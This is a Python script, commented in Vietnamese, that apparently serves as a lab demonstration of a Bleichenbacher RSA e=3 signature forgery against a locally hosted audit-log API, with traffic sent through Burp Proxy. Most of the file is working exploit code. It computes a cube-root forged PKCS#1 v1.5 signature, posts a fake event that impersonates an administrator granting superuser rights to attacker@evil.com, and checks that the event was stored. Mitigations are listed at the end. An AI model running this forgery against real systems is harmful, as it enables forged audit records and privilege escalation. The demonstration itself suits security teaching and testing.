#!/usr/bin/env python3
"""
Bleichenbacher Signature Forgery Demo - RSA e=3 Attack

Demo này cho thấy cách forge RSA signature với e=3 và gửi payload giả lên hệ thống.

Quy trình:
1. Sử dụng RSA keypair e=3 đã đăng ký trong hệ thống
2. Forge signature KHÔNG CẦN private key
3. Gửi payload giả với forged signature → THÀNH CÔNG!

Traffic đi qua Burp Proxy (localhost:8080) để phân tích
"""

import base64
import hashlib
import json
import time
import requests
from typing import Tuple

# ============================================================================
# CẤU HÌNH - Gửi qua Burp Proxy port 8080
# ============================================================================
# Target server
TARGET_HOST = "localhost"
TARGET_PORT = 80

# Burp Proxy
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 8080

# Proxy config cho requests
PROXIES = {
    "http": f"http://{PROXY_HOST}:{PROXY_PORT}",
    "https": f"http://{PROXY_HOST}:{PROXY_PORT}"
}

# API base URL (target qua proxy)
API_BASE = f"http://{TARGET_HOST}:{TARGET_PORT}"


# ============================================================================
# THÔNG TIN RSA e=3 KEY ĐÃ ĐĂNG KÝ TRONG DATABASE
# ============================================================================
# Key này đã được tạo và approve trước đó
EXISTING_SERVICE_ID = "attacker-service-1765043006"
EXISTING_KEY_ID = "attacker-service-1765043006:v1765043006"

# Public Key PEM (e=3, 2048-bit) - đã lưu trong database
EXISTING_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAqwglvN67SKRLYhzj0KrI
LAm2aV6x+x48bAJARVgN5FUD6a+tZxzT8RVNvNi5yUEAGrqexkP/fHmocvRIPXVN
3GpCUWB1DcYZjNvdJ0DTFnRmyFG9P4nRS57o/e4m4OxEiF11LFnbXjxtzKK06ILh
3/EgDY/yxVgMbcXBi8cuXe33X3r+W/0dLq2kJWGR9WD5U3hU5RIJ35VfsyGEqIMC
zoNgKYJju2Rnljrf6tbC3jouyuupS1PhAIC5LH+GN3+MI36910rn9dxXPPBM3hTM
gU27KXlNPx6ixQZCWC179Vm9x5uG9i1V02SaF4WtYesr5K/Q03VazhOgJGgJuTFW
1QIBAw==
-----END PUBLIC KEY-----"""


def print_header(title: str):
    print(f"\n{'━'*3} {title} {'━'*3}\n")


def integer_cube_root(n: int) -> int:
    """
    Tính căn bậc 3 của số nguyên lớn (integer cube root).
    Sử dụng Newton-Raphson method.
    """
    if n < 0:
        return -integer_cube_root(-n)
    if n == 0:
        return 0
    
    # Initial guess
    x = 1 << ((n.bit_length() + 2) // 3)
    
    while True:
        x_new = (2 * x + n // (x * x)) // 3
        if x_new >= x:
            break
        x = x_new
    
    # Verify and adjust
    while x ** 3 > n:
        x -= 1
    while (x + 1) ** 3 <= n:
        x += 1
    
    return x


def forge_signature_bleichenbacher(message: bytes, key_size_bytes: int = 256) -> bytes:
    """
    Forge RSA PKCS#1 v1.5 signature sử dụng Bleichenbacher cube root attack.
    
    Tấn công hoạt động vì:
    1. Với e=3: signature³ = EM (mod n)
    2. Nếu EM được craft sao cho EM < n, thì signature = ∛EM (exact)
    3. Weak verifier chỉ check: 00 01 prefix + hash có mặt đâu đó
    
    EM được craft:
    00 01 FF 00 [HASH] [GARBAGE đủ để lấp đầy key_size]
    """
    # Compute hash
    message_hash = hashlib.sha256(message).digest()
    
    # Craft EM: 00 01 FF 00 [HASH] [GARBAGE]
    # Weak verifier chỉ check:
    #   - Bắt đầu bằng 00 01
    #   - Có 00 separator trong 20 bytes đầu
    #   - Hash xuất hiện đâu đó sau separator
    
    prefix = b'\x00\x01\xff\x00'  # 00 01 FF 00
    
    # Thêm hash ngay sau prefix
    em_start = prefix + message_hash
    
    # Padding với zeros để đủ key_size
    em = em_start + b'\x00' * (key_size_bytes - len(em_start))
    
    print(f"\n  EM được craft (60 bytes đầu):")
    print(f"  {em[:60].hex()}")
    print(f"  → Bắt đầu với 00 01: ✓")
    print(f"  → Có FF padding: ✓")
    print(f"  → Có 00 separator: ✓")
    print(f"  → Chứa hash message: ✓")
    
    # Convert EM to integer
    em_int = int.from_bytes(em, byteorder='big')
    
    # Compute cube root
    # Với e=3: signature³ = EM → signature = ∛EM
    sig_int = integer_cube_root(em_int)
    
    # Điều chỉnh để sig³ >= em (quan trọng!)
    while sig_int ** 3 < em_int:
        sig_int += 1
    
    # Convert back to bytes
    forged_sig = sig_int.to_bytes(key_size_bytes, byteorder='big')
    
    return forged_sig


def send_forged_event(service_id: str, key_id: str, forged_signature: bytes, event_data: dict, use_proxy: bool = True):
    """Gửi event với chữ ký giả đến API (qua Burp proxy)."""
    # Canonical JSON
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    # Encode forged signature
    sig_b64 = base64.b64encode(forged_signature).decode('utf-8')
    
    payload = {
        "service_id": service_id,
        "event_type": "FORGED_ADMIN_ACTION",
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    print(f"\n  Payload:")
    print(f"    service_id: {service_id}")
    print(f"    event_type: FORGED_ADMIN_ACTION")
    print(f"    public_key_id: {key_id}")
    print(f"    event_data: {json.dumps(event_data, indent=2)}")
    print(f"    signature: {sig_b64[:50]}...")
    
    # Gửi qua Burp proxy
    if use_proxy:
        print(f"\n  📡 Gửi qua Burp Proxy ({PROXY_HOST}:{PROXY_PORT})...")
        try:
            resp = requests.post(
                f"{API_BASE}/v1/logs",
                json=payload,
                proxies=PROXIES,
                timeout=30
            )
        except requests.exceptions.ProxyError as e:
            print(f"\n  ⚠️  Không thể kết nối Burp Proxy!")
            print(f"      Đảm bảo Burp Suite đang chạy và lắng nghe tại {PROXY_HOST}:{PROXY_PORT}")
            print(f"      Error: {e}")
            print(f"\n  → Thử gửi trực tiếp không qua proxy...")
            resp = requests.post(
                f"{API_BASE}/v1/logs",
                json=payload,
                timeout=30
            )
    else:
        resp = requests.post(
            f"{API_BASE}/v1/logs",
            json=payload,
            timeout=30
        )
    
    return resp


def verify_event_in_database(event_id: str, use_proxy: bool = True):
    """Xác nhận event đã được lưu vào database."""
    try:
        if use_proxy:
            resp = requests.get(
                f"{API_BASE}/v1/logs/{event_id}",
                proxies=PROXIES,
                timeout=30
            )
        else:
            resp = requests.get(
                f"{API_BASE}/v1/logs/{event_id}",
                timeout=30
            )
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return None


def main():
    print("=" * 70)
    print("       BLEICHENBACHER SIGNATURE FORGERY DEMO")
    print("       Traffic qua Burp Proxy (localhost:8080)")
    print("=" * 70)
    print()
    print("Demo này cho thấy cách FORGE signature và gửi payload GIẢ lên hệ thống!")
    print("Attacker KHÔNG CẦN private key!")
    print()
    print(f"🔧 Cấu hình:")
    print(f"   Target: {API_BASE}")
    print(f"   Proxy:  {PROXY_HOST}:{PROXY_PORT} (Burp Suite)")
    
    # ========================================
    # PHẦN 1: Sử dụng RSA keypair e=3 đã có
    # ========================================
    print_header("PHẦN 1: SỬ DỤNG RSA KEYPAIR e=3 ĐÃ ĐĂNG KÝ")
    
    print(f"  Service ID: {EXISTING_SERVICE_ID}")
    print(f"  Key ID: {EXISTING_KEY_ID}")
    print(f"  Algorithm: rsa-pkcs1v15 (VULNERABLE)")
    print(f"  Public Exponent (e): 3 ← VULNERABLE!")
    print(f"  Key đã được approve trong database.")
    
    # ========================================
    # PHẦN 2: Tạo payload giả
    # ========================================
    print_header("PHẦN 2: TẠO PAYLOAD GIẢ")
    
    # Payload giả mạo - giả vờ admin đã cấp quyền superuser!
    fake_event = {
        "action": "admin.grant_superuser",
        "actor": "admin@company.com",  # Giả mạo admin!
        "target": "attacker@evil.com",
        "permissions": ["superuser", "delete_all", "access_secrets"],
        "timestamp": "2025-12-08T10:00:00Z",
        "note": "FORGED by Bleichenbacher attack - no private key needed!"
    }
    
    event_canonical = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    print(f"Event giả:")
    print(f"  {json.dumps(fake_event, indent=2)}")
    
    # ========================================
    # PHẦN 3: FORGE SIGNATURE (không cần private key!)
    # ========================================
    print_header("PHẦN 3: FORGE SIGNATURE (KHÔNG CẦN PRIVATE KEY!)")
    
    print("Thực hiện Bleichenbacher cube root attack...")
    print()
    print("  Giải thích:")
    print("  1. Với e=3: signature³ = EM (mod n)")
    print("  2. Craft EM sao cho EM < n")
    print("  3. Tính: signature = ∛EM (cube root)")
    print("  4. Weak verifier chỉ check prefix và hash → BYPASS!")
    
    forged_signature = forge_signature_bleichenbacher(
        message=event_canonical.encode('utf-8'),
        key_size_bytes=256  # RSA-2048 = 256 bytes
    )
    
    print(f"\n  ✓ Forged signature (hex, 40 chars đầu):")
    print(f"    {forged_signature.hex()[:40]}...")
    
    # ========================================
    # PHẦN 4: GỬI PAYLOAD GIẢ QUA BURP PROXY
    # ========================================
    print_header("PHẦN 4: GỬI PAYLOAD GIẢ QUA BURP PROXY")
    
    print("Gửi event với chữ ký GIẢ đến /v1/logs...")
    print(f"Request sẽ đi qua Burp Proxy để bạn có thể xem/sửa...")
    
    resp = send_forged_event(
        EXISTING_SERVICE_ID, 
        EXISTING_KEY_ID, 
        forged_signature, 
        fake_event,
        use_proxy=True
    )
    
    print(f"\n  Response:")
    print(f"    Status Code: {resp.status_code}")
    
    try:
        resp_json = resp.json()
        print(f"    Body: {json.dumps(resp_json, indent=6)}")
        
        if resp.status_code == 200 and resp_json.get("status") == "accepted":
            event_id = resp_json.get("id")
            
            print()
            print("  " + "!" * 50)
            print("  ⚠️  CHỮ KÝ GIẢ ĐÃ ĐƯỢC CHẤP NHẬN!")
            print("  ⚠️  PAYLOAD GIẢ ĐÃ LƯU VÀO DATABASE!")
            print("  " + "!" * 50)
            
            # ========================================
            # PHẦN 5: XÁC NHẬN TRONG DATABASE
            # ========================================
            print_header("PHẦN 5: XÁC NHẬN EVENT GIẢ TRONG DATABASE")
            
            if event_id:
                stored_event = verify_event_in_database(event_id, use_proxy=True)
                if stored_event:
                    print(f"  ✓ Event ID {event_id} tồn tại trong database!")
                    print(f"    service_id: {stored_event.get('service_id')}")
                    print(f"    event_type: {stored_event.get('event_type')}")
                    print(f"    verified: {stored_event.get('verified')}")
                    print(f"    event_data: {json.dumps(stored_event.get('event_data'), indent=6)}")
                else:
                    print(f"  Không thể verify event trong database")
        else:
            print(f"\n  Response message: {resp_json}")
            
    except Exception as e:
        print(f"    Raw: {resp.text}")
        print(f"    Error: {e}")
    
    # ========================================
    # KẾT LUẬN
    # ========================================
    print()
    print("=" * 70)
    print("       KẾT LUẬN")
    print("=" * 70)
    print()
    print("TẤN CÔNG THÀNH CÔNG KHI:")
    print("  ✓ RSA sử dụng e=3 (public exponent nhỏ)")
    print("  ✓ Verifier CHỈ kiểm tra:")
    print("      - Prefix 00 01")
    print("      - Hash có mặt đâu đó trong EM")
    print("  ✓ KHÔNG kiểm tra:")
    print("      - Đủ FF padding bytes (>= 8)")
    print("      - ASN.1 DigestInfo structure")
    print("      - Vị trí chính xác của hash")
    print()
    print("HẬU QUẢ:")
    print("  • Attacker KHÔNG CẦN private key!")
    print("  • Có thể forge signature cho BẤT KỲ message nào!")
    print("  • Có thể đưa log giả vào hệ thống audit!")
    print("  • Có thể giả mạo hành động của admin!")
    print()
    print("CÁCH PHÒNG CHỐNG:")
    print("  1. Sử dụng e=65537 (standard RSA)")
    print("  2. Dùng STRICT PKCS#1 v1.5 verifier")
    print("  3. Tốt hơn: Dùng RSA-PSS hoặc Ed25519")
    print("  4. Kiểm tra đầy đủ cấu trúc padding")
    print()
    print("=" * 70)
    print("  Xem chi tiết request/response trong Burp Suite!")
    print("=" * 70)


if __name__ == "__main__":
    main()
